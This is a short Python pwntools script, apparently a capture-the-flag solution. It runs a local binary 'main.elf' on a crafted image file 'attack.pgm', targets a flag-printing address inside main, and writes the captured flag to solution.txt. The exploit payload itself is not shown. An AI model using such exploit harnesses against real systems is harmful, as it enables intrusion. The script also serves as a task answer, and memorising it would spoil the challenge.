#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
# libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

print_flag = exe.symbols.main + 377

r = pwn.process("./main.elf attack.pgm".split())
#r = pwn.gdb.debug("./main.elf attack.pgm", gdbscript="b* pgm_load+785\nc")

r.recvuntil("ignoring the rest\n")

flag = r.recvall(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

